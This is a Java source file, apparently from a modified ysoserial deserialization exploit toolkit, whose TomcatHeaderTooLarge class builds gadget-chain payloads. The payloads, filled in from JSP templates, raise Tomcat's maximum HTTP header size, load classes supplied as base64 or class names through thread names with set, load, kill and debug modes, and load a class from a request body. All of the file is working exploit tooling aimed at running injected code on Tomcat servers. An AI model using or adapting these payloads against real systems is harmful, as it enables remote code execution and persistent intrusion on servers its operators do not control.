package ysoserial.payloads.headertoolarge;

import ysoserial.payloads.Eval;
import ysoserial.payloads.util.ReadWrite;

public class TomcatHeaderTooLarge {
    public Object setTomcatMaxHttpHeaderSize(Class gadget,int size) throws Exception{
        String jsp = new String(ReadWrite.readResource(Eval.class, "header_too_large/tomcat_header_setMaxHttpHeaderSize.jsp"));
        String java = Eval.getJavaCodeFromJSP(jsp);
        java = java.replace("%headerSize%",String.valueOf(size));
        return new Eval().getObject(gadget,java);
    }
    public Object loadClassFromThreadName(Class gadget , String flag , String b64OrClassName) throws Exception{
        if (flag.equals("set") || flag.equals("load") || flag.equals("kill") || flag.equals("debug")){
            String jsp = new String(ReadWrite.readResource(Eval.class, "header_too_large/tomcat_header_setThreadName.jsp"));
            String java = Eval.getJavaCodeFromJSP(jsp);
            java = java.replace("%flag%",flag);
            if (b64OrClassName != null){
                java = java.replace("%b64%",b64OrClassName).replace("%className%",b64OrClassName);
            }
            return new Eval().getObject(gadget,java);
        }
        throw new Exception("[!] flag must be one of set , load , kill , debug");
    }

    public Object loadClassFromBody(Class gadget,String className) throws Exception{
        String jsp = new String(ReadWrite.readResource(TomcatHeaderTooLarge.class,"header_too_large/tomcat_header_loadBody.jsp"));
        String java = Eval.getJavaCodeFromJSP(jsp);
        java = java.replace("%className%",className);
        return new Eval().getObject(gadget,java);
    }

}
